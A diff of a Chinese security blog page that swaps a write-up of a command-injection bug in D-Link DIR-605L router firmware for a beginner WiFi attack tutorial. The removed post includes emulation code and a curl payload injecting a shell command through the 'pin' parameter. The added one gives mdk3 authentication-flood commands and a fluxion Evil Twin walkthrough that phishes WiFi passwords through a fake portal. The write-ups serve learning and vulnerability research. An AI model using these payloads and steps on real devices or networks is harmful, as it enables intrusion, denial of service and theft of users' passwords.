@@ -9,7 +9,7 @@
     
     <title>
         
-            CNVD-2026-28535漏洞挖掘分享 |
+            wifi渗透入门 |
         
         Zach0ry&#39;s home
     </title>
@@ -213,7 +213,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        CNVD-2026-28535漏洞挖掘分享
+                        wifi渗透入门
                     </div>
                 
 
@@ -241,13 +241,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2026-07-23 14:00:00</span>
+                <span class="datetime">2026-08-16 17:05:27</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Fri Jul 24 2026 09:45:34 GMT+0800">2026-07-24 09:45:34</span>
+                    <span class="datetime" data-updated="Wed Sep 09 2026 18:35:59 GMT+0800">2026-09-09 18:35:59</span>
                 </span>
             
         
@@ -256,7 +256,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/IOT%E5%AE%89%E5%85%A8/">IOT安全</a></li>
+                            <li class="category-item"><a href="/categories/%E8%BD%A6%E8%81%94%E7%BD%91/">车联网</a></li>
                         
                     
                 </ul>
@@ -267,7 +267,7 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/IOT/">IOT</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/wifi/">wifi</a></li>
                         
                     
                 </ul>
@@ -296,219 +296,187 @@
                     
 
                     
-                         <p>第一次自主漏洞挖掘，这里写一篇博客特此记录一下</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p><a class="link"   target="_blank" rel="noopener" href="https://legacyfiles.us.dlink.com/DIR-605L/REVA/FIRMWARE/DIR-605L_REVA_FIRMWARE_1.13.ZIP" >固件地址<i class="fas fa-external-link-alt"></i></a></p>
-<p>漏洞文件：&#x2F;bin&#x2F;boa</p>
-<p>漏洞函数：start_wps()</p>
-<p>函数地址：0x45aa28</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260722205248908.png"
-                        alt="image-20260722205248908"
-                 ></p>
-<p>该函数的调用方式不太一样</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723114533289.png"
-                        alt="image-20260723114533289"
-                 ></p>
-<p>HTTP请求-&gt;获取pin参数-&gt;start_wps()-&gt;sprintf拼接系统命令-&gt;system执行</p>
-<p>在函数中，程序首先通过：v2 &#x3D; *(_DWORD *)(a1 + 268)获取 HTTP 请求中的用户输入参数。</p>
-<p>然后通过：v3 &#x3D; strstr(v2,”pin&#x3D;”);查找用户提交的 PIN 参数。</p>
-<p>当参数存在时：wscd &#x3D; (const char *)(v3 + 4);获取用户可控内容。</p>
-<p>之后程序直接执行：sprintf(failed,”iwpriv wlan0 set_mib pin&#x3D;%s”,wscd);</p>
-<p>将用户输入拼接到系统命令中，最后：system(failed)执行该命令。</p>
-<p>由于用户输入未经过任何过滤，可以通过插入 Shell 特殊字符控制最终执行命令。</p>
-<h2 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h2><p>解包之后首先尝试运行</p>
-<p>看文件架构</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723102257932.png"
-                        alt="image-20260723102257932"
-                 ></p>
-<p>拷贝合适的调试工具</p>
-<p><code>cp $(which qemu-mips-static ) .</code></p>
-<p>运行boa文件发现初始化错误</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723102809099.png"
-                        alt="image-20260723102809099"
-                 > </p>
-<p>直接去ida查找报错字符<code>Initialize AP MIB failed!</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260722195130210.png"
-                        alt="image-20260722195130210"
-                 ></p>
-<p>所以这里需要apmib_init返回true才能让函数继续执行</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723102951467.png"
-                        alt="image-20260723102951467"
-                 > </p>
-<p>apmib_init()不在 boa 主程序里面，它来自外部动态库(.so)</p>
-<p>去找它的函数主体，在&#x2F;lib&#x2F;apmib.so文件中</p>
-<p>用ida打开</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/PixPin_2026-07-22_19-58-10.png"
-                        alt="PixPin_2026-07-22_19-58-10"
-                 ></p>
-<p>分析可知apmib_init()的作用：</p>
-<p>初始化路由器配置数据库（MIB），从Flash读取硬件配置、软件配置、用户配置，然后建立内存中的配置结构，供 boa 后面的 Web 页面调用。</p>
-<p>所以可以直接修改apmib_init函数执行函数，让它直接返回1</p>
-<p>创建apmib.c文件定义函数apmib_init（）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int ampib_init(void)</span><br><span class="line">&#123;</span><br><span class="line">     //Fake it.</span><br><span class="line">     return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+                         <h2 id="WiFi-认证洪水攻击"><a href="#WiFi-认证洪水攻击" class="headerlink" title="WiFi 认证洪水攻击"></a><strong>WiFi 认证洪水攻击</strong></h2><p>利用监听模式网卡 <code>wlan0mon</code> 向指定 BSSID 的无线接入点发送大量伪造的 802.11 Authentication（认证）请求，使 AP 不断处理认证信息，从而消耗设备资源，可能导致连接异常或服务不可用。它攻击的是 WiFi 的管理帧处理机制，而不是破解 WiFi 密码，也不会获取 WPA&#x2F;WPA2 密钥。</p>
+<p>模拟大量假的 WiFi 认证请求，对目标 AP 做“认证洪水型拒绝服务测试”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng --test wlan0mon</span><br></pre></td></tr></table></figure>
 
-<p>然后用gcc-mips-linux-gnu生成 MIPS 架构的 Linux 操作系统可执行文件</p>
-<p><code>mips-linux-gnu-gcc ./apmib.c -o apmib-ld.so -fPIC -shared</code></p>
-<p>之后重新运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ \</span><br><span class="line">./qemu-mips-static \</span><br><span class="line">-E LD_PRELOAD=&quot;/apmib-ld.so&quot; \</span><br><span class="line">./bin/boa</span><br></pre></td></tr></table></figure>
+<p>检测注入成功率</p>
+<p>将无线网卡插入虚拟机，通过iwconfig查看是否接入</p>
+<p>iwconfig主要是查看无线网卡配置的相关信息</p>
+<p>启用网卡前，建议先kill掉可能会影响的进程：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng check kill</span><br></pre></td></tr></table></figure>
 
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723104810257.png"
-                        alt="image-20260723104810257"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817101658352.png"
+                        alt="image-20260817101658352"
                  ></p>
-<p>qemu: uncaught target signal 11 (Segmentation fault) - core dumped</p>
-<p>ida调试去寻找报错位置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ \</span><br><span class="line">./qemu-mips-static \</span><br><span class="line">-E LD_PRELOAD=&quot;/apmib-ld.so&quot; \</span><br><span class="line">-g 1234 \</span><br><span class="line">./bin/boa</span><br></pre></td></tr></table></figure>
+<p><strong>启动监听模式</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
 
-
-
-<p>配置一下ida的远端调试信息</p>
-<p>hostname设置为虚拟机的ip,port为你起的那个端口</p>
+<p>启动之后查看本地网卡信息及使用iwconfig查看网卡信息：可以看见网卡模式已经变成Monitor模式</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260722200257340.png"
-                        alt="image-20260722200257340"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817100930397.png"
+                        alt="image-20260817100930397"
                  ></p>
-<p>在apmib_get的跳转报错了</p>
+<p><strong>扫描附近WIFI</strong></p>
+<p>查看附近要攻击目标的wifi相关信息</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p>图中可以看到目标wifi的相关信息</p>
+<p>目标 AP 在 11 信道。</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723105111125.png"
-                        alt="image-20260723105111125"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817101120145.png"
+                        alt="image-20260817101120145"
                  ></p>
-<p>真正触发程序崩溃的是 0x43B1A4 处的指令</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260722202457645.png"
-                        alt="image-20260722202457645"
-                 > </p>
-<p>查看 apmib.so 中apmib_get()函数的汇编代码</p>
-<p>int __fastcall apmib_get(int n500, unsigned __int8 *p_boot_ver)</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260722202743083.png"
-                        alt="image-20260722202743083"
-                 > </p>
-<p>这个函数实际上是从路由器的配置数据库（MIB）里，根据编号 n500，把对应配置值读取出来，复制到调用者提供的缓冲区 p_boot_ver</p>
-<p>apmib_get(配置项编号, 存放结果的地址)</p>
-<p>分析调用的实际情况知道每个pid对应的是什么 </p>
-<p>所以修改函数apmib_init（）</p>
-<blockquote>
-<p>脚本中#define MIB_WPS_MODE 0x3B的情况是不是这里的读取信息，在之后对start_wps()函数的讲解会讲到</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#define MIB_IP_ADDR  170</span><br><span class="line">#define MIB_HW_VER   0x250</span><br><span class="line">#define MIB_CAPTCHA  0x2C1</span><br><span class="line">// WPS mode</span><br><span class="line">#define MIB_WPS_MODE 0x3B</span><br><span class="line">int apmib_init()</span><br><span class="line">&#123;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line">// 防止boa初始化fork失败</span><br><span class="line">int fork(void)</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int apmib_get(int code, void *value)</span><br><span class="line">&#123;</span><br><span class="line">    int *v = (int *)value;</span><br><span class="line">    switch(code)</span><br><span class="line">    &#123;</span><br><span class="line">        // IP地址</span><br><span class="line">        case MIB_IP_ADDR:</span><br><span class="line">            *v = 0x7F000001;     //127.0.0.1</span><br><span class="line">            break;</span><br><span class="line">        // 硬件版本</span><br><span class="line">        case MIB_HW_VER:</span><br><span class="line">            *v = 0xF1;</span><br><span class="line">            break;</span><br><span class="line">        // 验证码</span><br><span class="line">        case MIB_CAPTCHA:</span><br><span class="line">            *v = 1;s</span><br><span class="line">            break;</span><br><span class="line">        // ★关键</span><br><span class="line">        // start_wps:</span><br><span class="line">        // apmib_get(0x3b,&amp;var)</span><br><span class="line">        //</span><br><span class="line">        // 0 -&gt; 进入:</span><br><span class="line">        // iwpriv wlan0 set_mib pin=%s</span><br><span class="line">        //</span><br><span class="line">        case MIB_WPS_MODE:</span><br><span class="line">            *v = 0;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            // 默认返回成功</span><br><span class="line">            *v = 0;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>锁定信道：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig wlan0mon channel 11</span><br></pre></td></tr></table></figure>
 
-<p>然后用gcc-mips-linux-gnu生成 MIPS 架构的 Linux 操作系统可执行文件</p>
-<p><code>mips-linux-gnu-gcc ./apmib.c -o apmib-ld.so -fPIC -shared</code></p>
-<p>然后就可以运行了</p>
-<p><code> sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD=&quot;/apmib-ld.so&quot;  ./bin/boa</code></p>
-<p> <img  
+<p>然后开始</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdk3 wlan0mon a -a 7A:1F:AB:1E:92:92 -v</span><br></pre></td></tr></table></figure>
+
+<p><img  
                        lazyload
                        alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723105150452.png"
-                        alt="image-20260723105150452"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817103027339.png"
+                        alt="image-20260817103027339"
                  ></p>
-<p>但是跳转的页面是错的</p>
+<p>运行了大约 10 分钟的 WiFi 认证洪水攻击，但是目标 WiFi 仍然可以正常连接和使用，所以这次 DoS（拒绝服务）测试没有造成实际影响。</p>
+<h2 id="wifi钓鱼攻击"><a href="#wifi钓鱼攻击" class="headerlink" title="wifi钓鱼攻击"></a>wifi钓鱼攻击</h2><h3 id="Evil-Twin"><a href="#Evil-Twin" class="headerlink" title="Evil Twin"></a>Evil Twin</h3><p>攻击者创建一个和真实 WiFi 一模一样的“假热点”，让设备误以为它是真实 WiFi。</p>
+<p>控制相同的账号密码</p>
+<h3 id="fluxion搭建钓鱼wifi"><a href="#fluxion搭建钓鱼wifi" class="headerlink" title="fluxion搭建钓鱼wifi"></a>fluxion搭建钓鱼wifi</h3><p>安装fluxion</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/FluxionNetwork/fluxion.git</span><br><span class="line">cd fluxion</span><br><span class="line">./fluxion.sh -i</span><br></pre></td></tr></table></figure>
+
+<p>出现语言选择就表示安装完成了，并进入以下页面。</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723105220920.png"
-                        alt="image-20260723105220920"
-                 > </p>
-<p>需要改动 web 目录下的 first.asp 文件</p>
-<p>将代码 self.location.href&#x3D;”Basic&#x2F;Wizard_Easy_LangSelect.asp”;注释掉，</p>
-<p>然后将self.location.href&#x3D;”Basic&#x2F;Wizard_Easy_Welcome.asp”;复制到else 代码块</p>
-<p>即</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723105452385.png"
-                        alt="image-20260723105452385"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817105905271.png"
+                        alt="image-20260817105905271"
                  ></p>
-<p>之后就可以成功访问</p>
+<p>选择Handshake Snooper 检索WPA&#x2F;WPA2加密散列。</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723110100491.png"
-                        alt="image-20260723110100491"
-                 > 接着对start_wps函数进行详细分析</p>
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817112844898.png"
+                        alt="image-20260817112844898"
+                 ></p>
+<p>扫描2.4 GHz的所有信道</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723120443884.png"
-                        alt="image-20260723120443884"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817113503008.png"
+                        alt="image-20260817113503008"
                  ></p>
-<p>要想执行到system命令注入入口</p>
-<p>程序会对var&#x2F;run&#x2F;wscd-wlan0.pid和&#x2F;var&#x2F;tmp&#x2F;wscd_status两个文件进行校验，要先创建出这两个文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p var/run</span><br><span class="line">mkdir -p var/tmp</span><br><span class="line">touch var/run/wscd-wlan0.pid</span><br><span class="line">touch var/tmp/wscd_status</span><br></pre></td></tr></table></figure>
-
-<p>并且传入参数中要以”pin&#x3D;····“的形式传入 </p>
-<p>且<code>apmib_get(59, &amp;n3);</code> 会获取wps配置，要继续修改apmib_get的函数伪造多一种判断情况</p>
-<p><code>#define MIB_WPS_MODE 0x3B</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#define MIB_IP_ADDR  170</span><br><span class="line">#define MIB_HW_VER   0x250</span><br><span class="line">#define MIB_CAPTCHA  0x2C1</span><br><span class="line">// WPS mode</span><br><span class="line">#define MIB_WPS_MODE 0x3B</span><br><span class="line">int apmib_init()</span><br><span class="line">&#123;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line">// 防止boa初始化fork失败</span><br><span class="line">int fork(void)</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int apmib_get(int code, void *value)</span><br><span class="line">&#123;</span><br><span class="line">    int *v = (int *)value;</span><br><span class="line">    switch(code)</span><br><span class="line">    &#123;</span><br><span class="line">        // IP地址</span><br><span class="line">        case MIB_IP_ADDR:</span><br><span class="line">            *v = 0x7F000001;     //127.0.0.1</span><br><span class="line">            break;</span><br><span class="line">        // 硬件版本</span><br><span class="line">        case MIB_HW_VER:</span><br><span class="line">            *v = 0xF1;</span><br><span class="line">            break;</span><br><span class="line">        // 验证码</span><br><span class="line">        case MIB_CAPTCHA:</span><br><span class="line">            *v = 1;</span><br><span class="line">            break;</span><br><span class="line">        case MIB_WPS_MODE:</span><br><span class="line">            *v = 0;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            *v = 0;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>之后就可以尝试运行了</p>
-<h2 id="模拟攻击"><a href="#模拟攻击" class="headerlink" title="模拟攻击"></a>模拟攻击</h2><p>还是起服务但是可以在gdb中调试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-mips-static \</span><br><span class="line">-E LD_PRELOAD=/apmib-ld.so \</span><br><span class="line">-g 1234 \</span><br><span class="line">./bin/boa</span><br></pre></td></tr></table></figure>
-
-<p>另开一个窗口来调试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./bin/boa</span><br><span class="line">set architecture mips</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure>
-
-<p>在进入system函数之前下断点，方便观察system函数的参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *0x45ab80</span><br></pre></td></tr></table></figure>
-
+<p>之后可一直选择推荐选项</p>
+<p>左上角的框中会搜索wifi信号，搜索到目标后可Ctrl+C退出</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723121054106.png"
-                        alt="image-20260723121054106"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817130214746.png"
+                        alt="image-20260817130214746"
                  ></p>
-<p>之后按<code>c</code>让它继续运行，期间他会停住等待输入</p>
-<p>开另一个窗口发送参数（这里以echo&gt;&#x2F;var&#x2F;run&#x2F;cnvd_test为例去测试执行）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --path-as-is \</span><br><span class="line">&#x27;http://127.0.0.1/Basic/wifisc_add_sta.asp?pin=12345678;echo&gt;/var/run/cnvd_test&#x27;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>回到gdb调试窗口看参数</p>
+<p>然后选择目标热点</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723121326353.png"
-                        alt="image-20260723121326353"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817130406804.png"
+                        alt="image-20260817130406804"
                  ></p>
-<p>看到我们伪造的命令已注入，C让它执行命令</p>
-<p> <img  
+<p>这里跳过</p>
+<p><img  
                        lazyload
                        alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723121456508.png"
-                        alt="image-20260723121456508"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817130442582.png"
+                        alt="image-20260817130442582"
                  ></p>
-<p>命令注入漏洞实现 </p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817130506972.png"
+                        alt="image-20260817130506972"
+                 ></p>
+<p>之后一直选择推荐的就好</p>
+<p>之后开始抓包</p>
+<p>期间要用其它设备去不停的连接攻击热点</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817110433058.png"
+                        alt="image-20260817110433058"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817130725268.png"
+                        alt="image-20260817130725268"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817111744300.png"
+                        alt="image-20260817111744300"
+                 ></p>
+<p>可以看到上方已经出现了搞wifi的相关信息</p>
+<p>选择邪恶双胞胎</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817130835160.png"
+                        alt="image-20260817130835160"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817130922411.png"
+                        alt="image-20260817130922411"
+                 ></p>
+<p>还是有推荐选择推荐</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817131007086.png"
+                        alt="image-20260817131007086"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817131055298.png"
+                        alt="image-20260817131055298"
+                 ></p>
+<p>选择断开原网络之后会让你选择一个钓鱼网页认证页面</p>
+<p>选择攻击对象的网页认证界面，这里选择路由器 品牌一致的最好，不然就选择通用的或者什么运营商的宽带也行</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/8771bb592fb7467db8dc67e8902f856d.png"
+                        alt="在这里插入图片描述"
+                 ></p>
+<p>然后就开始钓鱼了，会把原wifi强行断开连不上，让别人去连接这个开放的名字一模一样的克隆wifi,连上wifi后会上不了网，会跳转到一个页面，提示要输入wifi密码来修复wifi.</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817112402365.png"
+                        alt="image-20260817112402365"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817131559201.png"
+                       
+                 ></p>
+<p>用户点击进行输入，密码就会被保存下来</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260817112646578.png"
+                        alt="image-20260817112646578"
+                 ></p>
 
                     
                 </div>
@@ -521,7 +489,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/IOT/">IOT</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/wifi/">wifi</a>
                                     </li>
                                 
                             </ul>
@@ -573,31 +541,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2026/07/25/linux%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"
-                                   title="Linux提权学习"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">Linux提权学习</span>
-                                        <span class="post-nav-item">Prev posts</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2026/05/04/D-Link%20DCS-935L%E5%9B%BA%E4%BB%B6%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
-                                   title="D-Link DCS-935L固件栈溢出漏洞分析"
+                                   href="/2026/08/16/%E8%93%9D%E7%89%99/"
+                                   title="车联网之蓝牙协议"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">D-Link DCS-935L固件栈溢出漏洞分析</span>
+                                        <span class="post-nav-title-item text-ellipsis">车联网之蓝牙协议</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -726,7 +678,7 @@
             <div class="pc-post-toc right-toc">
